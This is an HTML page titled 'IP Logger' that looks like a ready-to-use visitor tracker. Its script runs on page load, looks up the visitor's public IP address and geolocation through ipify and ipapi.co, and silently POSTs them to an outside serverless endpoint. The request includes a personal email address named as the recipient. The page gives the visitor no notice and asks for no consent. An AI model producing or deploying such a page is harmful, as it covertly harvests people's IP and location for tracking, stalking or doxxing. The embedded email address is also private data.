<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body>
    <h1>Your IP Address Logger</h1>
    <script>
        $(document).ready(function() {
            // Automatically get IP address and location on page load
            $.get('https://api.ipify.org?format=json', function(data) {
                const ip = data.ip;
                $.get(`https://ipapi.co/${ip}/json/`, function(locationData) {
                    // Send data to your serverless function
                    $.post('https://your-function-url', {
                        ip: ip,
                        location: locationData,
                        email: 'fabegabe26@gmail.com' // Email address to send the data
                    });
                });
            });
        });
    </script>
</body>
</html>
